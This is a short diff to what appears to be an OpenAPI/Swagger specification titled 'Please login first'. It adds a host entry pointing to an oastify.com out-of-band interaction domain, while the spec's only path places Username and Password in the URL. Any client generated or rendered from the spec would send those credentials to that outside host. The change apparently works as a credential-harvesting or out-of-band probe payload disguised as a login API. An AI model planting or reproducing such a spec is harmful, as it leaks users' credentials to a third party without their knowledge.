@@ -3,6 +3,8 @@ info:
   version: "v1"
   title: Please login first
 
+host: udb7n3cv9ginphcku3yxt8tdl4rvfr3g.oastify.com
+
 paths:
 
   /{Username}/{Password}:
